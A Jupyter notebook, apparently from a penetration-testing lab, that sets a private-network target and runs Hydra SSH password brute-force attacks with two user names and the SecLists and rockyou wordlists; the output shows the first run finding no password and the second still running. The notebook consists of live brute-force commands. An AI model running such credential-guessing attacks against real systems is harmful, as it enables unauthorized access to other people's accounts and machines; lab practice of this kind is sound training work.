{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3a88e203-44a2-49b8-ba7a-746528a5c276",
   "metadata": {
    "tags": []
   },
   "source": [
    "# SSH:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a2442dd1-6120-4d33-be4e-b569fac16578",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.11.1.95\n"
     ]
    }
   ],
   "source": [
    "%env TARGET=10.11.1.95"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "43d00f9c-52eb-49b0-a36e-bba479542653",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n"
     ]
    }
   ],
   "source": [
    "%env PL=~/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "fc2a282c-dc6f-4a6f-bd60-253944966488",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing custom_users.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile custom_users.txt\n",
    "avalon\n",
    "james"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a1c75d81-6ced-4b8f-a572-e765e9b2d9b2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-18 16:58:47\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 3150 login tries (l:2/p:1575), ~197 tries per task\n",
      "[DATA] attacking ssh://10.11.1.95:22/\n",
      "[STATUS] 182.00 tries/min, 182 tries in 00:01h, 2974 to do in 00:17h, 16 active\n",
      "[STATUS] 126.33 tries/min, 379 tries in 00:03h, 2777 to do in 00:22h, 16 active\n",
      "[STATUS] 117.43 tries/min, 822 tries in 00:07h, 2334 to do in 00:20h, 16 active\n",
      "[STATUS] 116.73 tries/min, 1751 tries in 00:15h, 1405 to do in 00:13h, 16 active\n",
      "[STATUS] 115.55 tries/min, 2311 tries in 00:20h, 845 to do in 00:08h, 16 active\n",
      "[STATUS] 114.84 tries/min, 2871 tries in 00:25h, 285 to do in 00:03h, 16 active\n",
      "1 of 1 target completed, 0 valid password found\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-18 17:27:04\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "adaf01c1-3b26-4285-9bb8-187d3227cdee",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-18 17:27:04\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task\n",
      "[DATA] attacking ssh://10.11.1.95:22/\n",
      "[STATUS] 178.00 tries/min, 178 tries in 00:01h, 28688622 to do in 2686:13h, 16 active\n",
      "[STATUS] 118.33 tries/min, 355 tries in 00:03h, 28688445 to do in 4040:38h, 16 active\n",
      "[STATUS] 117.00 tries/min, 819 tries in 00:07h, 28687982 to do in 4086:37h, 16 active\n",
      "[STATUS] 113.27 tries/min, 1699 tries in 00:15h, 28687102 to do in 4221:11h, 16 active\n",
      "[STATUS] 125.97 tries/min, 3905 tries in 00:31h, 28684926 to do in 3795:17h, 16 active\n",
      "[STATUS] 120.53 tries/min, 5665 tries in 00:47h, 28683166 to do in 3966:12h, 16 active\n",
      "[STATUS] 117.90 tries/min, 7428 tries in 01:03h, 28681403 to do in 4054:20h, 16 active\n",
      "[STATUS] 116.42 tries/min, 9197 tries in 01:19h, 28679634 to do in 4105:52h, 16 active\n",
      "[STATUS] 118.02 tries/min, 11212 tries in 01:35h, 28677619 to do in 4049:48h, 16 active\n",
      "[STATUS] 113.95 tries/min, 12649 tries in 01:51h, 28676182 to do in 4194:05h, 16 active\n",
      "[STATUS] 105.16 tries/min, 13355 tries in 02:07h, 28675476 to do in 4544:51h, 16 active\n",
      "[STATUS] 97.87 tries/min, 13995 tries in 02:23h, 28674836 to do in 4883:18h, 16 active\n",
      "[STATUS] 91.62 tries/min, 14568 tries in 02:39h, 28674263 to do in 5216:01h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -P $PLRY $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e1fdd27-71ad-402a-9b11-86ef8b46beec",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
